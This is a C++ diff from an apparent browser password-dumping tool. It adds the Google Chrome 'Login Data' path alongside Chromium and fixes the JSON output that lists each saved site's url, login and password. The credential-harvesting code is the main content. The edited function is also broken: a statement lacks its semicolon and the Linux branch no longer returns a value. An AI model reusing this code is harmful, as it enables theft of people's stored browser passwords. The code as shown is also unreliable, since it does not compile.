@@ -4,7 +4,11 @@
 
 const std::string getPathToFile() {
 #ifdef __linux__
-    return (std::string(std::getenv("HOME")) + std::string("/.config/chromium/Default/Login Data"));
+    const std::vector<std::string> files = {
+        std::string(std::getenv("HOME")) + std::string("/.config/google-chrome/Default/Login Data"),
+        std::string(std::getenv("HOME")) + std::string("/.config/chromium/Default/Login Data")
+    }
+
 #else
     return "TODO: implement windows path";
 #endif
@@ -77,12 +81,15 @@ std::string jsonEscapeString(const std::string str) {
 
 std::string toJson(Records::const_iterator begin, Records::const_iterator end) {
     std::string result = "[";
-    for(auto it = begin; it != end; ++it) {
+    for(auto it = begin; it != end;) {
         result += "{";
         result += "\"url\": \"" + jsonEscapeString(it->url) + "\",";
         result += "\"login\": \"" + jsonEscapeString(it->login) + "\",";
         result += "\"password\": \"" + jsonEscapeString(it->password) + "\"";
         result += "}";
+        if (++it != end) {
+            result += ", ";
+        }
     }
     result += "]";
 
